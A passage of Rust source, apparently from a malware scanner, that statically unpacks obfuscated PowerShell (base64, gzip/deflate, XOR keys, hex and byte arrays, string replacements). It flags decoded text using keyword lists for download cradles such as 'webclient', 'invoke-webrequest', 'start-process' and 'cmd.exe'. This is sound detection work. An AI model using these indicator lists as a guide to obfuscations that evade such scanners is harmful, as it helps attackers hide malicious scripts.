static PS_BYTE_ARRAY_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*@\(\s*((?:\d{1,3}\s*,\s*){2,}\d{1,3})\s*\)"#,
    )
    .expect("ps byte array assign regex")
});

#[allow(clippy::expect_used)]
static PS_CAST_BYTE_ARRAY_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\[\s*byte\s*\[\s*\]\s*\]\s*\(\s*((?:\d{1,3}\s*,\s*){2,}\d{1,3})\s*\)"#,
    )
    .expect("ps cast byte array assign regex")
});

#[allow(clippy::expect_used)]
static READ_TO_END_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)\.ReadToEnd\s*\(\s*\)"#).expect("readtoend regex"));

#[allow(clippy::expect_used)]
static JSON_SCRIPT_B64_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(\s*'\{[^']*"Script"\s*:\s*"([A-Za-z0-9+/=]+)"[^']*\}'\s*\|\s*ConvertFrom-Json\s*\)\.Script\s*\)"#,
    )
    .expect("json script b64 regex")
});

#[derive(Clone, Copy)]
enum PsCompressionStream {
    Gzip,
    Deflate,
}

fn expand_gzip_base64_literals(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if !lower.contains("gzipstream") && !lower.contains("deflatestream") {
        return text.to_string();
    }

    let matches: Vec<(usize, usize, String)> = GZIP_B64_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let b64 = caps.get(1)?.as_str();
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            let (start, end, stream) = compression_wrapper_bounds(text, full.start(), full.end())
                .unwrap_or_else(|| {
                    let stream = if lower.contains("deflatestream") {
                        PsCompressionStream::Deflate
                    } else {
                        PsCompressionStream::Gzip
                    };
                    (full.start(), full.end(), stream)
                });
            let inflated = decompress_ps_stream(&decoded, stream, 2 * 1024 * 1024)?;
            let s = decode_payload(&inflated).into_owned().replace('\'', "''");
            Some((start, end, format!("'{s}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn decompress_ps_stream(
    bytes: &[u8],
    stream: PsCompressionStream,
    max_bytes: usize,
) -> Option<Vec<u8>> {
    use std::io::Read as _;

    match stream {
        PsCompressionStream::Gzip => crate::aes_chain::crypto::gunzip(bytes, max_bytes).ok(),
        PsCompressionStream::Deflate => {
            let mut decoder = flate2::read::DeflateDecoder::new(bytes);
            let mut out = Vec::new();
            std::io::Read::take(&mut decoder, max_bytes.saturating_add(1) as u64)
                .read_to_end(&mut out)
                .ok()?;
            if out.len() > max_bytes {
                return None;
            }
            Some(out)
        }
    }
}

fn expand_gzip_function_base64_variables(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if (!lower.contains("gzipstream") && !lower.contains("deflatestream"))
        || !lower.contains("frombase64string")
    {
        return text.to_string();
    }

    let mut b64_vars = std::collections::HashMap::new();
    for caps in PS_LONG_B64_VAR_ASSIGN_RE.captures_iter(text).take(32) {
        let Some(name) = caps.get(1) else { continue };
        let Some(value) = caps.get(2) else { continue };
        if value.as_str().len() <= 2 * 1024 * 1024 {
            b64_vars.insert(name.as_str().to_ascii_lowercase(), value.as_str());
        }
    }
    if b64_vars.is_empty() {
        return text.to_string();
    }

    let mut compression_functions = std::collections::HashMap::new();
    for caps in PS_FUNCTION_DEF_RE.captures_iter(text) {
        let Some(full) = caps.get(0) else { continue };
        let Some(name) = caps.get(1) else { continue };
        let body_end = text.len().min(full.end().saturating_add(4096));
        let body = text[full.end()..body_end].to_ascii_lowercase();
        if body.contains("gzipstream") {
            compression_functions.insert(
                name.as_str().to_ascii_lowercase(),
                PsCompressionStream::Gzip,
            );
        } else if body.contains("deflatestream") {
            compression_functions.insert(
                name.as_str().to_ascii_lowercase(),
                PsCompressionStream::Deflate,
            );
        }
    }
    if compression_functions.is_empty() {
        return text.to_string();
    }

    let matches: Vec<(usize, usize, String)> = PS_GZIP_FUNCTION_GETSTRING_VAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let out_var = caps.get(1)?.as_str();
            let function_name = caps.get(2)?.as_str().to_ascii_lowercase();
            let stream = *compression_functions.get(&function_name)?;
            let b64_var = caps.get(3)?.as_str().to_ascii_lowercase();
            let b64 = b64_vars.get(&b64_var)?;
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            let inflated = decompress_ps_stream(&decoded, stream, 4 * 1024 * 1024)?;
            let s = decode_payload(&inflated).into_owned().replace('\'', "''");
            Some((full.start(), full.end(), format!("${out_var} = '{s}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_xor_base64_function_calls(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if !lower.contains("function ")
        || (!text.contains('@') && !lower.contains("[byte"))
        || !text.contains('\'')
    {
        return text.to_string();
    }

    let keys: Vec<Vec<u8>> = PS_BYTE_ARRAY_ASSIGN_RE
        .captures_iter(text)
        .chain(PS_CAST_BYTE_ARRAY_ASSIGN_RE.captures_iter(text))
        .take(8)
        .filter_map(|caps| {
            let raw = caps.get(2)?.as_str();
            let key: Vec<u8> = raw
                .split(',')
                .filter_map(|part| part.trim().parse::<u8>().ok())
                .collect();
            (!key.is_empty() && key.len() <= 64).then_some(key)
        })
        .collect();
    if keys.is_empty() {
        return text.to_string();
    }

    let functions: Vec<String> = PS_FUNCTION_DEF_RE
        .captures_iter(text)
        .take(32)
        .filter_map(|caps| caps.get(1).map(|name| name.as_str().to_string()))
        .collect();
    if functions.is_empty() {
        return text.to_string();
    }

    let mut out = text.to_string();
    for name in functions {
        let call_re_str = format!(
            r#"(?i)(?:^|[^\w]){}\s*\(?\s*['"]([A-Za-z0-9+/=]{{8,8192}})['"]\s*\)?(?:\s+[01])?"#,
            regex::escape(&name)
        );
        let Ok(call_re) = Regex::new(&call_re_str) else {
            continue;
        };
        let mut candidates = Vec::new();
        for caps in call_re.captures_iter(&out).take(128) {
            let Some(full) = caps.get(0) else { continue };
            let Some(blob) = caps.get(1) else { continue };
            for key in &keys {
                let Some(decoded) = decode_xor_base64_string(blob.as_str(), key) else {
                    continue;
                };
                if !is_printable_script_fragment(&decoded) {
                    continue;
                }
                let raw_match = full.as_str();
                let name_start = raw_match
                    .find(|c: char| c.is_alphanumeric() || c == '_')
                    .unwrap_or(0);
                let prefix = raw_match[..name_start].to_string();
                candidates.push((full.start(), full.end(), prefix, decoded));
                break;
            }
        }
        if !candidates
            .iter()
            .any(|(_, _, _, decoded)| xor_base64_decoded_fragment_is_interesting(decoded))
        {
            continue;
        }
        for (start, end, prefix, decoded) in candidates.into_iter().rev() {
            out.replace_range(
                start..end,
                &format!("{}'{}'", prefix, decoded.replace('\'', "''")),
            );
        }
    }
    out
}

fn decode_xor_base64_string(blob: &str, key: &[u8]) -> Option<String> {
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(blob)
        .ok()?;
    if bytes.len() > 64 * 1024 || key.is_empty() {
        return None;
    }
    let decoded: Vec<u8> = bytes
        .iter()
        .enumerate()
        .map(|(idx, byte)| byte ^ key[idx % key.len()])
        .collect();
    String::from_utf8(decoded).ok()
}

fn is_printable_script_fragment(value: &str) -> bool {
    if value.is_empty() || value.len() > 64 * 1024 {
        return false;
    }
    let printable = value
        .chars()
        .filter(|ch| ch.is_ascii_graphic() || ch.is_ascii_whitespace())
        .count();
    printable.saturating_mul(100) / value.chars().count().max(1) >= 85
}

fn xor_base64_decoded_fragment_is_interesting(value: &str) -> bool {
    let lower = value.to_ascii_lowercase();
    lower.contains("http://")
        || lower.contains("https://")
        || lower.contains("download")
        || lower.contains("webclient")
        || lower.contains("frombase64string")
        || lower.contains(".getstring")
        || lower.contains("invoke-webrequest")
        || lower.contains("invoke-restmethod")
}

fn compression_wrapper_bounds(
    text: &str,
    b64_start: usize,
    b64_end: usize,
) -> Option<(usize, usize, PsCompressionStream)> {
    let lower = text.to_ascii_lowercase();
    let start = lower[..b64_start].rfind("new-object system.io.streamreader")?;
    let after = &text[b64_end..text.len().min(b64_end.saturating_add(8192))];
    let read_to_end = READ_TO_END_RE.find(after)?;
    let end = b64_end + read_to_end.end();
    let wrapper = &lower[start..end];
    if !wrapper.contains("memorystream") {
        return None;
    }
    let stream = if wrapper.contains("gzipstream") {
        PsCompressionStream::Gzip
    } else if wrapper.contains("deflatestream") {
        PsCompressionStream::Deflate
    } else {
        return None;
    };
    Some((start, end, stream))
}

fn expand_json_script_base64(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = JSON_SCRIPT_B64_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let b64 = caps.get(1)?.as_str();
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            let s = decode_payload(&decoded).into_owned();
            Some((full.start(), full.end(), format!("'{}'", s)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_getstring_base64_literals(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = GETSTRING_B64_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let encoding = caps.get(1)?.as_str().to_ascii_lowercase();
            let b64 = caps.get(2)?.as_str();
            let decoded = decode_ps_base64_string(b64)?;
            let value = match encoding.as_str() {
                "unicode" => decode_utf16_lossy(&decoded, false)?,
                "bigendianunicode" => decode_utf16_lossy(&decoded, true)?,
                _ => String::from_utf8_lossy(&decoded).into_owned(),
            };
            Some((
                full.start(),
                full.end(),
                format!("'{}'", value.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_getstring_base64_variables(text: &str) -> String {
    let bindings = ps_string_bindings(text);
    if bindings.is_empty() {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = GETSTRING_B64_VAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let encoding = caps.get(1)?.as_str().to_ascii_lowercase();
            let var = caps.get(2)?.as_str().to_ascii_lowercase();
            let b64 = bindings.get(&var)?;
            let decoded = decode_ps_base64_string(b64)?;
            if !should_inline_base64_decoded_payload(&decoded) {
                return None;
            }
            let value = match encoding.as_str() {
                "unicode" => decode_utf16_lossy(&decoded, false)?,
                "bigendianunicode" => decode_utf16_lossy(&decoded, true)?,
                _ => String::from_utf8_lossy(&decoded).into_owned(),
            };
            Some((
                full.start(),
                full.end(),
                format!("'{}'", value.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn decode_ps_base64_string(encoded: &str) -> Option<Vec<u8>> {
    let cleaned: String = encoded.chars().filter(|c| !c.is_whitespace()).collect();
    if cleaned.is_empty() {
        return None;
    }
    base64::engine::general_purpose::STANDARD
        .decode(cleaned)
        .ok()
}

fn expand_getstring_byte_arrays(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = GETSTRING_BYTE_ARRAY_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let encoding = caps.get(1)?.as_str();
            let bytes = parse_ps_byte_array(caps.get(2)?.as_str())?;
            if bytes.len() > 128 * 1024 {
                return None;
            }
            let value = decode_ps_getstring_bytes(encoding, &bytes)?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", value.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn parse_ps_byte_array(nums: &str) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    for part in nums.split(',') {
        let part = part.trim();
        let value = if let Some(hex) = part.strip_prefix("0x").or_else(|| part.strip_prefix("0X")) {
            u16::from_str_radix(hex, 16).ok()?
        } else {
            part.parse::<u16>().ok()?
        };
        let byte = u8::try_from(value).ok()?;
        out.push(byte);
        if out.len() > 128 * 1024 {
            return None;
        }
    }
    (!out.is_empty()).then_some(out)
}

fn decode_ps_getstring_bytes(encoding: &str, bytes: &[u8]) -> Option<String> {
    match encoding.to_ascii_lowercase().as_str() {
        "unicode" => decode_utf16_lossy(bytes, false),
        "bigendianunicode" => decode_utf16_lossy(bytes, true),
        "utf32" => decode_utf32_lossy(bytes, false),
        _ => Some(String::from_utf8_lossy(bytes).into_owned()),
    }
}

fn expand_convert_frombase64_literals(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    let mut matches = Vec::new();
    let mut cursor = 0usize;
    while let Some(rel) = lower[cursor..].find("frombase64string") {
        let name_start = cursor + rel;
        // Walk back ~32 bytes to look for the `[...Convert]::` prefix, but
        // clamp to a UTF-8 char boundary — a fixed byte offset can land
        // inside a multi-byte char (e.g. CJK-named vars), which would panic
        // the `text[search_start..name_start]` slice below.
        let mut search_start = name_start.saturating_sub(32);
        while search_start > 0 && !text.is_char_boundary(search_start) {
            search_start -= 1;
        }
        let Some(bracket_rel) = text[search_start..name_start].rfind('[') else {
            cursor = name_start + "frombase64string".len();
            continue;
        };
        let call_start = search_start + bracket_rel;
        if !lower[call_start..name_start].contains("convert]::") {
            cursor = name_start + "frombase64string".len();
            continue;
        }
        let Some(open_rel) = text[name_start..].find('(') else {
            break;
        };
        let mut pos = name_start + open_rel + 1;
        while pos < text.len() {
            let Some(ch) = text[pos..].chars().next() else {
                break;
            };
            if !ch.is_whitespace() {
                break;
            }
            pos += ch.len_utf8();
        }
        let Some((b64, quote_end)) = parse_ps_quoted_argument(text, pos) else {
            cursor = name_start + "frombase64string".len();
            continue;
        };
        let mut end = quote_end;
        while end < text.len() {
            let Some(ch) = text[end..].chars().next() else {
                break;
            };
            if ch.is_whitespace() {
                end += ch.len_utf8();
                continue;
            }
            if ch == ')' {
                end += ch.len_utf8();
            }
            break;
        }
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            cursor = name_start + "frombase64string".len();
            continue;
        };
        let decoded = decode_payload(&decoded).into_owned();
        let decoded_lower = decoded.to_ascii_lowercase();
        if !decoded_lower.contains("http://")
            && !decoded_lower.contains("https://")
            && !decoded_lower.contains("download")
            && !decoded_lower.contains("frombase64string")
            && !decoded_lower.contains("invoke-")
        {
            cursor = end;
            continue;
        }
        let decoded = decoded.replace('\'', "''");
        matches.push((call_start, end, format!("'{decoded}'")));
        cursor = end;
    }
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn append_decoded_frombase64_literals(text: &str) -> String {
    let mut out = text.to_string();
    let mut seen = std::collections::HashSet::new();
    for caps in FROMB64_LONG_LITERAL_RE.captures_iter(text) {
        let Some(b64) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        if !seen.insert(b64) {
            continue;
        }
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            continue;
        };
        let decoded = decode_payload(&decoded);
        let decoded_lower = decoded.to_ascii_lowercase();
        if decoded_lower.contains("http://")
            || decoded_lower.contains("https://")
            || decoded_lower.contains("download")
            || decoded_lower.contains("frombase64string")
        {
            out.push('\n');
            out.push_str(&decoded);
        }
    }
    out
}

fn should_inline_base64_decoded_payload(decoded: &[u8]) -> bool {
    if decoded.is_empty() {
        return false;
    }
    let text = decode_payload(decoded);
    let lower = text.to_ascii_lowercase();
    if lower.contains("http://")
        || lower.contains("https://")
        || lower.contains("download")
        || lower.contains("frombase64string")
        || lower.contains("invoke-")
        || lower.contains("powershell")
        || lower.contains("new-object")
        || lower.contains("start-process")
        || lower.contains("cmd.exe")
    {
        return true;
    }

    if decoded.len() > 64 * 1024 {
        return false;
    }
    let printable = decoded
        .iter()
        .filter(|b| b.is_ascii_graphic() || matches!(**b, b' ' | b'\r' | b'\n' | b'\t'))
        .count();
    let hard_controls = decoded
        .iter()
        .filter(|b| b.is_ascii_control() && !matches!(**b, b'\r' | b'\n' | b'\t'))
        .count();
    printable * 100 >= decoded.len() * 90 && hard_controls * 100 <= decoded.len()
}

fn decode_utf16_lossy(bytes: &[u8], big_endian: bool) -> Option<String> {
    if bytes.len() % 2 != 0 {
        return None;
    }
    let u16s: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|pair| {
            if big_endian {
                u16::from_be_bytes([pair[0], pair[1]])
            } else {
                u16::from_le_bytes([pair[0], pair[1]])
            }
        })
        .collect();
    Some(String::from_utf16_lossy(&u16s))
}

fn decode_utf32_lossy(bytes: &[u8], big_endian: bool) -> Option<String> {
    if bytes.len() % 4 != 0 {
        return None;
    }
    let decoded: String = bytes
        .chunks_exact(4)
        .map(|chunk| {
            let value = if big_endian {
                u32::from_be_bytes([chunk[0], chunk[1], chunk[2], chunk[3]])
            } else {
                u32::from_le_bytes([chunk[0], chunk[1], chunk[2], chunk[3]])
            };
            char::from_u32(value).unwrap_or(char::REPLACEMENT_CHARACTER)
        })
        .collect();
    Some(decoded)
}

fn expand_base64_literals(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = B64_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let b64 = caps.get(1)?.as_str();
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            if !should_inline_base64_decoded_payload(&decoded) {
                return None;
            }
            let s = decode_payload(&decoded).into_owned();
            Some((full.start(), full.end(), format!("'{}'", s)))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

#[allow(clippy::expect_used)]
static PS_EMBEDDED_SINGLE_QUOTE_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*'''([^'\r\n]{1,8192})'''"#)
        .expect("ps embedded single quote assignment")
});

fn expand_ps_embedded_single_quote_assignments(text: &str) -> String {
    PS_EMBEDDED_SINGLE_QUOTE_ASSIGN_RE
        .replace_all(text, "$$$1=\"'$2'\"")
        .into_owned()
}

#[allow(clippy::expect_used)]
static REGEX_REPLACE_CALL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[regex\]::Replace\s*\(\s*'([^']*)'\s*,\s*''?([^']*)''?\s*,\s*''?([^']*)''?\s*\)"#,
    )
    .expect("regex replace call")
});

#[allow(clippy::expect_used)]
static B64_REGEX_REPLACE_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\[regex\]::Replace\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*'+([^']*)'+\s*,\s*'+([^']*)'+\s*\)\s*\)"#,
    )
    .expect("b64 regex replace variable call")
});

fn expand_regex_replace_calls(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = REGEX_REPLACE_CALL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let haystack = caps.get(1)?.as_str();
            let needle = caps.get(2)?.as_str();
            let repl = caps.get(3)?.as_str();
            Some((
                full.start(),
                full.end(),
                format!("'{}'", haystack.replace(needle, repl)),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_regex_replace_base64_variables(text: &str) -> String {
    let bindings = ps_string_bindings(text);
    if bindings.is_empty() {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = B64_REGEX_REPLACE_VAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let var = caps.get(1)?.as_str().to_ascii_lowercase();
            let needle = caps.get(2)?.as_str();
            let replacement = caps.get(3)?.as_str();
            let value = bindings.get(&var)?;
            let b64 = value.replace(needle, replacement);
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            let decoded = decode_payload(&decoded).into_owned().replace('\'', "''");
            Some((full.start(), full.end(), format!("'{decoded}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn ps_string_bindings(text: &str) -> std::collections::HashMap<String, String> {
    let mut bindings = std::collections::HashMap::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(name), Some(value)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            bindings.insert(name.as_str().to_ascii_lowercase(), value);
        }
    }
    insert_ps_path_combine_bindings(text, &mut bindings);
    insert_ps_env_concat_bindings(text, &mut bindings);
    insert_ps_alias_bindings(text, &mut bindings);
    bindings
}

fn ps_dynamic_download_bindings(text: &str) -> std::collections::HashMap<String, String> {
    let mut bindings = ps_string_bindings(text);
    insert_ps_interpolated_double_quote_bindings(text, &mut bindings, true);
    insert_ps_alias_bindings(text, &mut bindings);
    bindings
}

fn insert_ps_interpolated_double_quote_bindings(
    text: &str,
    bindings: &mut std::collections::HashMap<String, String>,
    preserve_env_refs: bool,
) {
    for _ in 0..4 {
        let mut changed = false;
        for caps in PS_DQ_INTERPOLATED_ASSIGN_RE.captures_iter(text) {
            let (Some(dst), Some(value)) = (caps.get(1), caps.get(2)) else {
                continue;
            };
            let value = value.as_str();
            if !value.contains('$') {
                continue;
            }
            let Some(expanded) =
                interpolate_ps_double_quoted_string(value, bindings, preserve_env_refs)
            else {
                continue;
            };
            if is_large_literal_carrier(&expanded) {
                continue;
            }
            let key = dst.as_str().to_ascii_lowercase();
            if bindings.get(&key) != Some(&expanded) {
                bindings.insert(key, expanded);
                changed = true;
            }
        }
        if !changed {
            break;
        }
    }
}

fn insert_ps_env_concat_bindings(
    text: &str,
    bindings: &mut std::collections::HashMap<String, String>,
) {
    for caps in PS_ENV_CONCAT_ASSIGN_RE.captures_iter(text) {
        let (Some(dst), Some(base)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let Some(leaf) = caps
            .get(3)
            .map(|m| m.as_str().replace("''", "'"))
            .or_else(|| caps.get(4).map(|m| m.as_str().to_string()))
        else {
            continue;
        };
        if leaf.is_empty() || is_large_literal_carrier(&leaf) {
            continue;
        }
        let joined = join_ps_path_components(base.as_str(), &leaf);
        bindings.insert(dst.as_str().to_ascii_lowercase(), joined);
    }
}

fn insert_ps_alias_bindings(text: &str, bindings: &mut std::collections::HashMap<String, String>) {
    for _ in 0..4 {
        let mut changed = false;
        for caps in PS_ALIAS_ASSIGN_RE.captures_iter(text) {
            let (Some(dst), Some(src)) = (caps.get(1), caps.get(2)) else {
                continue;
            };
            let src_key = src.as_str().to_ascii_lowercase();
            let Some(value) = bindings.get(&src_key).cloned() else {
                continue;
            };
            if is_large_literal_carrier(&value) {
                continue;
            }
            let dst_key = dst.as_str().to_ascii_lowercase();
            if bindings.get(&dst_key) != Some(&value) {
                bindings.insert(dst_key, value);
                changed = true;
            }
        }
        if !changed {
            break;
        }
    }
}

fn expand_start_process_argument_list(text: &str) -> String {
    let mut out = text.to_string();
    let mut cursor = 0usize;
    let lower = text.to_ascii_lowercase();
    while let Some(rel) = lower[cursor..].find("-argumentlist") {
        let pos = cursor + rel + "-argumentlist".len();
        let Some((inner, end)) = parse_ps_quoted_argument(text, pos) else {
            cursor = pos;
            continue;
        };
        let normalized = inner
            .replace("\\\"", "\"")
            .replace("`\"", "\"")
            .replace("\\'", "'");
        let normalized_lower = normalized.to_ascii_lowercase();
        if normalized_lower.contains("frombase64string")
            || normalized_lower.contains("download")
            || normalized.contains("http://")
            || normalized.contains("https://")
        {
            out.push('\n');
            out.push_str(&normalized);
        }
        cursor = end;
    }
    out
}

fn parse_ps_quoted_argument(text: &str, start: usize) -> Option<(String, usize)> {
    let mut pos = start;
    while pos < text.len() {
        let ch = text[pos..].chars().next()?;
        if !ch.is_whitespace() {
            break;
        }
        pos += ch.len_utf8();
    }
    let quote = text[pos..].chars().next()?;
    if quote != '\'' && quote != '"' {
        return None;
    }
    pos += quote.len_utf8();
    let mut out = String::new();
    while pos < text.len() {
        let ch = text[pos..].chars().next()?;
        pos += ch.len_utf8();
        if ch == quote {
            if quote == '\'' && text[pos..].starts_with('\'') {
                out.push('\'');
                pos += 1;
                continue;
            }
            return Some((out, pos));
        }
        if quote == '"' && ch == '`' {
            if let Some(next) = text[pos..].chars().next() {
                out.push(next);
                pos += next.len_utf8();
                continue;
            }
        }
        out.push(ch);
    }
    None
}

#[allow(clippy::expect_used)]
static HEX_SPLIT_CHAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)'((?:[0-9a-f]{2}\s+){3,}[0-9a-f]{2})'\s*-Split\s*['"][^'"]*['"]\s*(?:\|\s*)?foreach(?:-object)?\s*\{[^{}]*?toint16\s*\(\s*\$_\s*,\s*16\s*\)[^{}]*?\}"#,
    )
    .expect("hex split char loop")
});

fn expand_hex_split_char_loop(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = HEX_SPLIT_CHAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let hex = caps.get(1)?.as_str();
            let bytes: Vec<u8> = hex
                .split_whitespace()
                .filter_map(|part| u8::from_str_radix(part, 16).ok())
                .collect();
            if bytes.is_empty() {
                return None;
            }
            let decoded = String::from_utf8_lossy(&bytes).into_owned();
            Some((full.start(), full.end(), format!("'{}'", decoded)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static GETSTRING_UNWRAP_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(?:UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*'([^']*)'\s*\)"
    ).expect("getstring unwrap")
});

fn expand_getstring_wrapper(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = GETSTRING_UNWRAP_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let inner = caps.get(1)?.as_str();
            Some((full.start(), full.end(), format!("'{}'", inner)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static REPLACE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"'([^'\\]*(?:\\.[^'\\]*)*)'\s*-(i|c)?replace\s*'([^'\\]*(?:\\.[^'\\]*)*)'\s*,\s*'([^'\\]*(?:\\.[^'\\]*)*)'"#)
        .expect("replace")
});

fn expand_ps_replace(text: &str) -> String {
    let mut out = text.to_string();
    // Run repeatedly so chained -replace ('a' -replace 'x','y' -replace 'z','w') works.
    loop {
        let mut hit = false;
        let next: Vec<(usize, usize, String)> = REPLACE_RE
            .captures_iter(&out)
            .filter_map(|caps| {
                let full = caps.get(0)?;
                let haystack = caps.get(1)?.as_str();
                let case_insensitive = caps
                    .get(2)
                    .is_some_and(|op| op.as_str().eq_ignore_ascii_case("i"));
                let needle = caps.get(3)?.as_str();
                let repl = caps.get(4)?.as_str();
                let new_str = replace_ps_literal(haystack, needle, repl, case_insensitive);
                Some((full.start(), full.end(), format!("'{}'", new_str)))
            })
            .collect();
        if next.is_empty() {
            break;
        }
        for (start, end, replacement) in next.into_iter().rev() {
            out.replace_range(start..end, &replacement);
            hit = true;
        }
        if !hit {
            break;
        }
    }
    loop {
        let next = find_ps_double_quoted_replace_operator_matches(&out);
        if next.is_empty() {
            break;
        }
        for (start, end, replacement) in next.into_iter().rev() {
            out.replace_range(start..end, &replacement);
        }
    }
    out
}

fn find_ps_double_quoted_replace_operator_matches(text: &str) -> Vec<(usize, usize, String)> {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut start = 0;
    while let Some(rel) = text[start..].find('"') {
        let literal_start = start + rel;
        let Some((literal_end, haystack)) = parse_ps_static_quoted_literal(text, literal_start)
        else {
            start = literal_start + 1;
            continue;
        };

        let mut pos = skip_ascii_ws(bytes, literal_end);
        let Some((after_operator, case_insensitive)) = parse_ps_replace_operator(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, after_operator);
        let Some((needle_end, needle)) = parse_ps_static_quoted_literal(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, needle_end);
        if bytes.get(pos) != Some(&b',') {
            start = literal_end;
            continue;
        }
        pos = skip_ascii_ws(bytes, pos + 1);
        let Some((repl_end, repl)) = parse_ps_static_quoted_literal(text, pos) else {
            start = literal_end;
            continue;
        };
        let replaced =
            replace_ps_literal(&haystack, &needle, &repl, case_insensitive).replace('\'', "''");
        matches.push((literal_start, repl_end, format!("'{replaced}'")));
        start = repl_end;
    }
    matches
}

fn parse_ps_replace_operator(text: &str, pos: usize) -> Option<(usize, bool)> {
    if text.as_bytes().get(pos) != Some(&b'-') {
        return None;
    }
    let mut pos = pos + 1;
    let mut case_insensitive = false;
    if text
        .as_bytes()
        .get(pos)
        .is_some_and(|b| b.eq_ignore_ascii_case(&b'i') || b.eq_ignore_ascii_case(&b'c'))
    {
